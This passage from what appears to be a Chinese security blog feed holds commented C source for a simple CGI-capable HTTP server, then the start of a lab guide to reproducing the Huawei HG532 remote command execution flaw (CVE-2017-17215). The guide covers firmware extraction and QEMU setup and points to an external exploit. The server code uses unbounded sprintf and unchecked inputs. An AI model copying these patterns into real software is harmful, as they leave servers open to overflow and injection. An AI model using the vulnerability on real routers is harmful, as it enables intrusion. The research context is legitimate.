class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;P&gt;Error prohibited CGI execution.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Print out an error message with perror() (for system errors; based</span><span class="hljs-comment"> * on value of errno, which indicates system call errors) and exit the</span><span class="hljs-comment"> * program indicating an error. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">error_die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *sc)</span>&#123;    perror(sc);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Execute a CGI script.  Will need to set environment variables as</span><span class="hljs-comment"> * appropriate.</span><span class="hljs-comment"> * Parameters: client socket descriptor</span><span class="hljs-comment"> *             path to the CGI script */</span><span class="hljs-comment">/**********************************************************************/</span> <span class="hljs-comment">// cgi用于动态网页的处理</span> <span class="hljs-comment">// execute_cgi函数创建了两个进程，子进程用于cgi文件的处理，父进程用于往socket读写数据</span><span class="hljs-type">void</span> <span class="hljs-title function_">execute_cgi</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *path,</span><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *method, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *query_string)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-type">int</span> cgi_output[<span class="hljs-number">2</span>];    <span class="hljs-type">int</span> cgi_input[<span class="hljs-number">2</span>];    <span class="hljs-type">pid_t</span> pid;    <span class="hljs-type">int</span> status;    <span class="hljs-type">int</span> i;    <span class="hljs-type">char</span> c;    <span class="hljs-type">int</span> numchars = <span class="hljs-number">1</span>;    <span class="hljs-type">int</span> content_length = <span class="hljs-number">-1</span>;    buf[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;A&#x27;</span>; buf[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;exec cgi\n&quot;</span>);    <span class="hljs-comment">//get方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf)) <span class="hljs-comment">/* read &amp; discard headers */</span>        &#123;             <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;get\n&quot;</span>);            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        &#125;    <span class="hljs-comment">//post方法</span>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">/*POST*/</span>    &#123;                numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))        &#123;            <span class="hljs-comment">// &quot;Content-Length:&quot;长度为15个字符，所以将前15个字符比较。 </span>            buf[<span class="hljs-number">15</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;            <span class="hljs-comment">// 如果是Content-Length，读取这个改字段转为整数</span>            <span class="hljs-keyword">if</span> (strcasecmp(buf, <span class="hljs-string">&quot;Content-Length:&quot;</span>) == <span class="hljs-number">0</span>)            &#123;                content_length = atoi(&amp;(buf[<span class="hljs-number">16</span>]));                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;lenght:%d\n&quot;</span>,content_length);            &#125;            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        &#125;        <span class="hljs-comment">//无法处理的话，400错误</span>        <span class="hljs-keyword">if</span> (content_length == <span class="hljs-number">-1</span>) &#123;            bad_request(client);            <span class="hljs-keyword">return</span>;        &#125;    &#125;    <span class="hljs-keyword">else</span><span class="hljs-comment">/*HEAD or other*/</span>    &#123;    &#125;    <span class="hljs-comment">//创建管道</span>    <span class="hljs-comment">//子进程写管道</span>    <span class="hljs-keyword">if</span> (pipe(cgi_output) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">//服务错误500</span>        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//子进程写管道</span>    <span class="hljs-keyword">if</span> (pipe(cgi_input) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">//服务错误500</span>        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//创建子进程</span>    <span class="hljs-keyword">if</span> ( (pid = fork()) &lt; <span class="hljs-number">0</span> ) &#123;        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//响应成功</span>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-comment">// 这下面是另一个坑，进程通信。</span>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* child: CGI script */</span>    &#123;        <span class="hljs-type">char</span> meth_env[<span class="hljs-number">255</span>];        <span class="hljs-type">char</span> query_env[<span class="hljs-number">255</span>];        <span class="hljs-type">char</span> length_env[<span class="hljs-number">255</span>];        dup2(cgi_output[<span class="hljs-number">1</span>], STDOUT);        dup2(cgi_input[<span class="hljs-number">0</span>], STDIN);        close(cgi_output[<span class="hljs-number">0</span>]);        close(cgi_input[<span class="hljs-number">1</span>]);        <span class="hljs-built_in">sprintf</span>(meth_env, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, method);        putenv(meth_env);        <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>) &#123;            <span class="hljs-built_in">sprintf</span>(query_env, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, query_string);            putenv(query_env);        &#125;        <span class="hljs-keyword">else</span> &#123;   <span class="hljs-comment">/* POST */</span>            <span class="hljs-built_in">sprintf</span>(length_env, <span class="hljs-string">&quot;CONTENT_LENGTH=%d&quot;</span>, content_length);            putenv(length_env);        &#125;        execl(path, <span class="hljs-literal">NULL</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* parent */</span>        close(cgi_output[<span class="hljs-number">1</span>]);        close(cgi_input[<span class="hljs-number">0</span>]);        <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>)            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; content_length; i++) &#123;                recv(client, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                write(cgi_input[<span class="hljs-number">1</span>], &amp;c, <span class="hljs-number">1</span>);            &#125;        <span class="hljs-keyword">while</span> (read(cgi_output[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span>)            send(client, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);        close(cgi_output[<span class="hljs-number">0</span>]);        close(cgi_input[<span class="hljs-number">1</span>]);        waitpid(pid, &amp;status, <span class="hljs-number">0</span>);    &#125;&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Get a line from a socket, whether the line ends in a newline,</span><span class="hljs-comment"> * carriage return, or a CRLF combination.  Terminates the string read</span><span class="hljs-comment"> * with a null character.  If no newline indicator is found before the</span><span class="hljs-comment"> * end of the buffer, the string is terminated with a null.  If any of</span><span class="hljs-comment"> * the above three line terminators is read, the last character of the</span><span class="hljs-comment"> * string will be a linefeed and the string will be terminated with a</span><span class="hljs-comment"> * null character.</span><span class="hljs-comment"> * Parameters: the socket descriptor</span><span class="hljs-comment"> *             the buffer to save the data in</span><span class="hljs-comment"> *             the size of the buffer</span><span class="hljs-comment"> * Returns: the number of bytes stored (excluding null) */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//处理包，大概流程是循环读取每个字符</span><span class="hljs-comment">//如果回车符(\r)的后面不是换行符(\n)或者读取失败就把当前读取的字符置为换行，从而终止循环</span><span class="hljs-comment">//如果没有成功接收到字符，以 \n 结尾，结束循环</span><span class="hljs-comment">//最后以\n结尾</span><span class="hljs-type">int</span> <span class="hljs-title function_">get_line</span><span class="hljs-params">(<span class="hljs-type">int</span> sock, <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> size)</span>&#123;    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;    <span class="hljs-type">char</span> c = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-type">int</span> n;    <span class="hljs-comment">//</span>    <span class="hljs-keyword">while</span> ((i &lt; size - <span class="hljs-number">1</span>) &amp;&amp; (c != <span class="hljs-string">&#x27;\n&#x27;</span>))    &#123;        n = recv(sock, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)        &#123;            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\r&#x27;</span>)            &#123;                n = recv(sock, &amp;c, <span class="hljs-number">1</span>, MSG_PEEK);                <span class="hljs-comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span>                <span class="hljs-keyword">if</span> ((n &gt; <span class="hljs-number">0</span>) &amp;&amp; (c == <span class="hljs-string">&#x27;\n&#x27;</span>))                    recv(sock, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                <span class="hljs-keyword">else</span>                    c = <span class="hljs-string">&#x27;\n&#x27;</span>;            &#125;            buf[i] = c;            i++;        &#125;        <span class="hljs-keyword">else</span>            c = <span class="hljs-string">&#x27;\n&#x27;</span>;    &#125;    buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">return</span>(i);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Return the informational HTTP headers about a file. */</span><span class="hljs-comment">/* Parameters: the socket to print the headers on</span><span class="hljs-comment"> *             the name of the file */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//响应头</span><span class="hljs-type">void</span> <span class="hljs-title function_">headers</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    (<span class="hljs-type">void</span>)filename;  <span class="hljs-comment">/* could use filename to determine file type */</span>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">strcpy</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Give a client a 404 not found status message. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">not_found</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-comment">//将内容打印到缓存，并且发送出去</span>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 404 NOT FOUND\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;your request because the resource specified\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;is unavailable or nonexistent.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Send a regular file to the client.  Use headers, and report</span><span class="hljs-comment"> * errors to client if they occur.</span><span class="hljs-comment"> * Parameters: a pointer to a file structure produced from the socket</span><span class="hljs-comment"> *              file descriptor</span><span class="hljs-comment"> *             the name of the file to serve */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span>&#123;    FILE *resource = <span class="hljs-literal">NULL</span>;    <span class="hljs-type">int</span> numchars = <span class="hljs-number">1</span>;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    buf[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;A&#x27;</span>; buf[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))  <span class="hljs-comment">/* read &amp; discard headers */</span>        numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));    <span class="hljs-comment">//打开文件，判断是否有文件</span>    resource = fopen(filename, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (resource == <span class="hljs-literal">NULL</span>)        not_found(client);    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-comment">//构造响应头给客户端</span>        headers(client, filename);        <span class="hljs-comment">//将文件内容发送给客户端</span>        cat(client, resource);    &#125;    fclose(resource);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* This function starts the process of listening for web connections</span><span class="hljs-comment"> * on a specified port.  If the port is 0, then dynamically allocate a</span><span class="hljs-comment"> * port and modify the original port variable to reflect the actual</span><span class="hljs-comment"> * port.</span><span class="hljs-comment"> * Parameters: pointer to variable containing the port to connect on</span><span class="hljs-comment"> * Returns: the socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//初始化 httpd 服务，包括建立套接字，绑定端口，进行监听等。</span><span class="hljs-type">int</span> <span class="hljs-title function_">startup</span><span class="hljs-params">(u_short *port)</span>&#123;    <span class="hljs-type">int</span> httpd = <span class="hljs-number">0</span>;    <span class="hljs-type">int</span> on = <span class="hljs-number">1</span>;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">name</span>;</span>    <span class="hljs-comment">//正常的socket创建流程</span>    httpd = socket(PF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (httpd == <span class="hljs-number">-1</span>)        error_die(<span class="hljs-string">&quot;socket&quot;</span>);    <span class="hljs-built_in">memset</span>(&amp;name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(name));    name.sin_family = AF_INET;    name.sin_port = htons(*port);    name.sin_addr.s_addr = htonl(INADDR_ANY);    <span class="hljs-comment">//setsockopt()函数，用于任意类型、任意状态套接口的设置选项值 </span>    <span class="hljs-keyword">if</span> ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="hljs-keyword">sizeof</span>(on))) &lt; <span class="hljs-number">0</span>)      &#123;          error_die(<span class="hljs-string">&quot;setsockopt failed&quot;</span>);    &#125;    <span class="hljs-comment">//绑定socket到端口，port等于0，系统会随机分配一个端口（bind函数里实现）</span>    <span class="hljs-keyword">if</span> (bind(httpd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;name, <span class="hljs-keyword">sizeof</span>(name)) &lt; <span class="hljs-number">0</span>)        error_die(<span class="hljs-string">&quot;bind&quot;</span>);    <span class="hljs-comment">// 这个if的作用是将自动分配的端口传给port</span>    <span class="hljs-keyword">if</span> (*port == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* if dynamically allocating a port */</span>    &#123;        <span class="hljs-type">socklen_t</span> namelen = <span class="hljs-keyword">sizeof</span>(name);          <span class="hljs-comment">// 获取socket绑定的地址信息</span>        <span class="hljs-keyword">if</span> (getsockname(httpd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;name, &amp;namelen) == <span class="hljs-number">-1</span>)            error_die(<span class="hljs-string">&quot;getsockname&quot;</span>);        *port = ntohs(name.sin_port);    &#125;    <span class="hljs-comment">//监听端口</span>    <span class="hljs-keyword">if</span> (listen(httpd, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>)        error_die(<span class="hljs-string">&quot;listen&quot;</span>);    <span class="hljs-keyword">return</span>(httpd);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that the requested web method has not been</span><span class="hljs-comment"> * implemented.</span><span class="hljs-comment"> * Parameter: the client socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">unimplemented</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 501 guan zhu jia ran, dun dun jie chan\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/TITLE&gt;&lt;/HEAD&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;BODY&gt;&lt;P&gt;if you watch this page, please follow JiaRan_Diana.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;br/&gt;&lt;img src=&#x27;https://img2.baidu.com/it/u=2323296913,2613522307&amp;amp;fm=253&amp;amp;app=138&amp;amp;size=w931&amp;amp;n=0&amp;amp;f=JPEG&amp;amp;fmt=auto?sec=1658854800&amp;amp;t=7b90c5387e83fb57a89e051eccbb7eb9&#x27;&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> server_sock = <span class="hljs-number">-1</span>; <span class="hljs-comment">//服务端套接字接口</span>    u_short port = <span class="hljs-number">4000</span>; <span class="hljs-comment">//端口</span>    <span class="hljs-type">int</span> client_sock = <span class="hljs-number">-1</span>;<span class="hljs-comment">//已连接套接字描述符，初始化为-1（客户端）</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_name</span>;</span>     <span class="hljs-type">socklen_t</span>  client_name_len = <span class="hljs-keyword">sizeof</span>(client_name);    <span class="hljs-type">pthread_t</span> newthread;        <span class="hljs-comment">//调用startup()函数，建立一个监听套接字，在对应的端口建立httpd服务</span>    server_sock = startup(&amp;port);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;httpd running on port %d\n&quot;</span>, port);    <span class="hljs-comment">//循环调用accept()函数来等待客户端的连接，accept()会议阻塞的方式运行</span>    <span class="hljs-comment">//有客户端链接后返回到client_sock，去创建新线程处理请求</span>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    &#123;        client_sock = accept(server_sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_name, &amp;client_name_len);        <span class="hljs-keyword">if</span> (client_sock == <span class="hljs-number">-1</span>)            error_die(<span class="hljs-string">&quot;accept&quot;</span>);        <span class="hljs-comment">//创建新线程用accept_request()函数处理新请求，同时将客户端socket作为参数传过去</span>        <span class="hljs-comment">/* accept_request(&amp;client_sock); */</span>        <span class="hljs-keyword">if</span> (pthread_create(&amp;newthread , <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> *)accept_request, (<span class="hljs-type">void</span> *)(<span class="hljs-type">intptr_t</span>)client_sock) != <span class="hljs-number">0</span>)            perror(<span class="hljs-string">&quot;pthread_create&quot;</span>);    &#125;    close(server_sock);    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215(华为HG532远程命令执行漏洞)</title>
    <link href="/article/3a44f1fa.html"/>
    <url>/article/3a44f1fa.html</url>
    
    <content type="html"><![CDATA[<p>固件和exp都已经放在这个地方了：<a href="https://gitee.com/p1piyang/backward-analysis/tree/master/">https://gitee.com/p1piyang/backward-analysis/tree/master/</a></p><p>建议先通一遍文章再动手复现，复现之前一定要保存虚拟机快照，防止出现各种奇奇怪怪的问题</p><p>首先要解决环境问题，这里只做配置说明，iot分析环境专门有一篇，请去看<code>IOT固件分析环境搭建</code> 的binwalk，qemu</p><h1 id="解压固件"><a href="#解压固件" class="headerlink" title="解压固件"></a>解压固件</h1><p>直接使用<code>binwalk -Me HG532eV100R001C02B015_upgrade_main.bin</code>命令来直接解压固件文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140542176.png" alt="image-20220402140542176"></p><p>解压完成后，在固件同文件夹下可以看到解压出来的文件夹</p><p>文件夹中的<code>squashfs-root</code>就是我们需要的文件系统了，如果squashfs-root中没有下图的各种文件系统，就是你的binwalk有不完整，去看<code>iot固件分析环境搭建</code></p><h1 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h1><p>我们要让qemu虚拟机和我们的ubuntu互通。</p><p>安装网络配置工具</p><div class="code-wrapper"><pre><code class="hljs sh">apt-get install bridge-utils uml-utilities</code></pre></div><h5 id="修改ubuntu网络配置文件-etc-network-interfaces"><a href="#修改ubuntu网络配置文件-etc-network-interfaces" class="headerlink" title="修改ubuntu网络配置文件 /etc/network/interfaces/"></a>修改ubuntu网络配置文件 <code>/etc/network/interfaces/</code></h5><p>sudo vim 你一定会把！</p><p>内容改成如下，图下提供了复制粘贴的代码（贴心人）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140548936.png" alt="image-20220402140548936"></p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet manualup ifconfig ens33 0.0.0.0 upauto br0iface br0 inet dhcpbridge_ports ens33bridge_maxwait 0</code></pre></div><h5 id="创建或修改qemu的网络接口启动文件脚本-etc-qemu-ifup"><a href="#创建或修改qemu的网络接口启动文件脚本-etc-qemu-ifup" class="headerlink" title="创建或修改qemu的网络接口启动文件脚本/etc/qemu-ifup"></a>创建或修改qemu的网络接口启动文件脚本<code>/etc/qemu-ifup</code></h5><p>如果没有这个文件直接创建就可以了，如果有的话将里边内容清空，然后写入下面脚本</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140556661.png" alt="image-20220402140556661"></p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-comment"># Script to bring a network (tap) device for qemu up.</span><span class="hljs-comment"># The idea is to add the tap device to the same bridge</span><span class="hljs-comment"># as we have default routing to.</span><span class="hljs-comment"># in order to be able to find brctl</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Executing /etc/qemu-ifup&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Bringing <span class="hljs-variable">$1</span> for bridge mode...&quot;</span>sudo /sbin/ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc up<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Adding <span class="hljs-variable">$1</span> to br0...&quot;</span>sudo /sbin/brctl addif br0 <span class="hljs-variable">$1</span><span class="hljs-built_in">sleep</span> 3</code></pre></div><p>然后依次执行如下操作</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#启动桥接网络赋予可执行权限</span>sudo chmod a+x <span class="hljs-regexp">/etc/</span>qemu-ifup<span class="hljs-comment">#重启网络服务，使配置生效（注意这个地方配置正常之后，如果你是mac，可能会让你输入mac密码，windows我不知道😬）</span>sudo <span class="hljs-regexp">/etc/i</span>nit.d/networking restart<span class="hljs-comment">#关闭ens33，启动桥接网络br0（这里如果显示eth0不存在没关系，直接启动br0）</span>sudo ifdown eth0sudo ifup br0</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140603509.png" alt="image-20220402140603509"></p><p>如图所示，当前网卡为br0</p><p>配置完之后，如果下面qemu虚拟机配置之后，仍然无法获取ip，重启ubuntu</p><h1 id="配置qemu虚拟机"><a href="#配置qemu虚拟机" class="headerlink" title="配置qemu虚拟机"></a>配置qemu虚拟机</h1><p>先去下载debian-mips-qemu镜像文件，每次固件分析要注意对应大小端序的镜像文件（还是有设备的好😭）</p><p>下载地址：<a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140611607.png" alt="image-20220402140611607"></p><p>我们需要红框里的两个文件，然后在文件所在地方启动qemu</p><blockquote><p>这里特别说明，最后一个参数<code>-nographic</code>带上是在终端中直接运行，不会弹出窗口运行，建议一定不要开，我这里开了之后这个窗口的返回快捷键和vmware的一模一样，就导致我只能在mac和qemu中间用，我回不去我的ubuntu了。</p></blockquote><div class="code-wrapper"><pre><code class="hljs sh">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:16:3e:00:00:01 -net tap 